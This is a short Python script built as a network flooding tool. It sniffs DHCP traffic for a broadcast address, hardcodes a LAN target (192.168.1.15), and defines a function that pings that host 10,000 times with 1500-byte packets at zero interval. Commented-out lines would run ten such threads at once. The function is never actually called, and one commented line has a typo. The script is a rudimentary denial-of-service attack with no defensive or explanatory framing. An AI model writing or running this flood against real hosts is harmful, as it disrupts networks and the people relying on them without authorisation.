from scapy.all import *
import pythonping as ping
def get_DHCP_broadcast():
    
    import subprocess
    cmd_command = 'ipconfig /renew'
    subprocess.Popen(cmd_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    while True:
        x = sniff(count=1, filter="udp and (port 67 or port 68)")  

        
        if DHCP in x[0]:
            print(x[0][DHCP].options)
            for option in x[0][DHCP].options:
                if isinstance(option, tuple) and option[0] == 'broadcast_address':
                    print("DHCP Options:", x[0][DHCP].options)
                    print("Broadcast Address:", option[1])
                    return option[1]  
            
#t=get_DHCP_broadcast()
t="192.168.1.15"
print(t)
def pinger():
    ping.ping(t, count=10000, interval=0, size=1500,timeout=0 )
    


#for i in range( 10):
    #list.append(threading.Thread(target=pinger))
    #ist[i].start()